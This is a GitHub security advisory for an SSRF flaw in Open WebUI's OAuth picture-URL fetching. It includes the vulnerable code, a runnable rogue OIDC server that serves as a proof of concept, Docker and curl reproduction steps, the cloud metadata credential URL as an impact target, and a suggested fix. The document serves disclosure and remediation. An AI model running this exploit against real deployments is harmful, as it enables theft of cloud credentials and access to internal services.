# [H] Open WebUI Vulnerable to SSRF via OAuth Profile Picture URL in _process_picture_url (oauth.py)

## Summary
Severity: High
Advisory: GHSA-24c9-2m8q-qhmh
CVE: CVE-2026-45338
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-24c9-2m8q-qhmh
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.0

## Details
## Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in `_process_picture_url()` in `backend/open_webui/utils/oauth.py` (line ~1338). The function fetches arbitrary URLs from OAuth `picture` claims without applying `validate_url()`, allowing an attacker to force the server to make HTTP requests to internal resources and exfiltrate the full response.

## Vulnerable Code
```python
# backend/open_webui/utils/oauth.py, line ~1337-1345
async def _process_picture_url(self, picture_url: str, access_token: str = None) -> str:
    # No validate_url() call here
    async with aiohttp.ClientSession(trust_env=True) as session:
        async with session.get(picture_url, **get_kwargs, ssl=AIOHTTP_CLIENT_SESSION_SSL) as resp:
            if resp.ok:
                picture = await resp.read()
                base64_encoded_picture = base64.b64encode(picture).decode('utf-8')
                return f'data:{guessed_mime_type};base64,{base64_encoded_picture}'
```

The codebase already uses `validate_url()` for the same SSRF protection pattern in other paths:
- `backend/open_webui/utils/files.py:38` - `validate_url(url)` before `requests.get(url)`
- `backend/open_webui/routers/images.py:800` - `validate_url(data)` before `requests.get(data)`

The omission in `_process_picture_url()` is inconsistent with the project's own security practices.

## Affected Code Paths

1. **New user OAuth signup** (line ~1556): `picture_url = await self._process_picture_url(picture_url, token.get('access_token'))`
2. **Existing user picture update on login** (line ~1536): when `OAUTH_UPDATE_PICTURE_ON_LOGIN=true`

## Steps to Reproduce

### Prerequisites
- Open WebUI instance with generic OIDC OAuth configured
- `ENABLE_OAUTH_SIGNUP=true`

### Setup

**1. Start a minimal OIDC server** that returns a malicious `picture` claim pointing to an internal canary endpoint:
```python
"""Minimal OIDC PoC server - save as poc_oidc.py"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, urllib.parse

SSRF_TARGET = "http://host.docker.internal:9000/canary"
CANARY = "SSRF_CONFIRMED_OPEN_WEBUI"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if path == "/.well-known/openid-configuration":
            self._json({"issuer":"http://host.docker.internal:9000",
                "authorization_endpoint":"http://localhost:9000/authorize",
                "token_endpoint":"http://host.docker.internal:9000/token",
                "userinfo_endpoint":"http://host.docker.internal:9000/userinfo",
                "jwks_uri":"http://host.docker.internal:9000/jwks",
                "response_types_supported":["code"],"subject_types_supported":["public"],
                "id_token_signing_alg_values_supported":["RS256"],
                "token_endpoint_auth_methods_supported":["client_secret_post","client_secret_basic"]})
        elif path == "/authorize":
            ru = query.get("redirect_uri",[""])[0]
            st = query.get("state",[""])[0]
            self.send_response(302)
            self.send_header("Location", f"{ru}?code=poc-code&state={st}")
            self.end_headers()
        elif path == "/userinfo":
            self._json({"sub":"attacker","email":"attacker@example.com","name":"Attacker","picture":SSRF_TARGET})
        elif path == "/jwks":
            self._json({"keys":[]})
        elif path == "/canary":
            self.send_response(200)
            self.send_header("Content-Type","text/plain")
            body = CANARY.encode()
            self.send_header("Content-Length",len(body))
            self.end_headers()
            self.wfile.write(body)
            print(f"!!! CANARY FETCHED - SSRF CONFIRMED !!!")
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        if "/token" in self.path:
            self._json({"access_token":"tok","token_type":"bearer","expires_in":3600,
                "userinfo":{"sub":"attacker","email":"attacker@example.com","name":"Attacker","picture":SSRF_TARGET}})
    def _json(self, d):
        b = json.dumps(d).encode()
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",len(b))
        self.end_headers()
        self.wfile.write(b)

HTTPServer(("0.0.0.0", 9000), Handler).serve_forever()
```

**2. Run the PoC server:**
```bash
python3 poc_oidc.py
```

**3. Start Open WebUI with Docker:**
```bash
docker run -d -p 3000:8080 \
  --name owui-ssrf-test \
  --add-host=host.docker.internal:host-gateway \
  -e ENABLE_OAUTH_SIGNUP=true \
  -e WEBUI_AUTH=true \
  -e OAUTH_CLIENT_ID=test-client \
  -e OAUTH_CLIENT_SECRET=test-secret \
  -e OPENID_PROVIDER_URL=http://host.docker.internal:9000/.well-known/openid-configuration \
  -e OAUTH_PROVIDER_NAME=TestOIDC \
  -e "OAUTH_SCOPES=openid email profile" \
  ghcr.io/open-webui/open-webui:main
```

**4. Create an admin account** at `http://localhost:3000`, then sign out.

**5. Click "Continue with TestOIDC"** on the login page.

**6. Observe the PoC server terminal** - it prints `!!! CANARY FETCHED - SSRF CONFIRMED !!!`

**7. Verify exfiltrated data is stored and readable:**
```bash
curl -s http://localhost:3000/api/v1/auths/ \
  -H "Authorization: Bearer <session-token>" | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
url = data.get('profile_image_url', '')
if 'base64,' in url:
    decoded = base64.b64decode(url.split('base64,',1)[1]).decode()
    print(f'DECODED: {decoded}')
"
```

**Result:** `DECODED: SSRF_CONFIRMED_OPEN_WEBUI`

The server fetched the attacker-controlled URL, base64-encoded the response, stored it as `profile_image_url`, and the attacker can read it back via the API.

## Impact

An attacker can force the Open WebUI server to make HTTP requests to:

- **Cloud metadata endpoints** (AWS IMDSv1 at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`) to steal IAM credentials
- **Internal network services** not exposed to the internet
- **Localhost-bound services** (Redis, Elasticsearch, internal APIs)

This is a **full-read SSRF**: the complete HTTP response body is exfiltrated to the attacker via the base64-encoded `profile_image_url` field.

## Configuration Note

This vulnerability requires `ENABLE_OAUTH_SIGNUP=true` (for the new-user path) or `OAUTH_UPDATE_PICTURE_ON_LOGIN=true` (for the existing-user path). While these are not default settings, they are standard in production deployments that use OAuth for user management, which is the primary use case for configuring OAuth at all.

## Suggested Fix

Apply `validate_url()` before fetching, consistent with existing patterns in the codebase:
```python
from open_webui.retrieval.web.utils import validate_url

async def _process_picture_url(self, picture_url: str, access_token: str = None) -> str:
    if not picture_url:
        return '/user.png'
    try:
        validate_url(picture_url)  # Add this line
        # ... rest unchanged
```

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-24c9-2m8q-qhmh
- https://nvd.nist.gov/vuln/detail/CVE-2026-45338
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.0
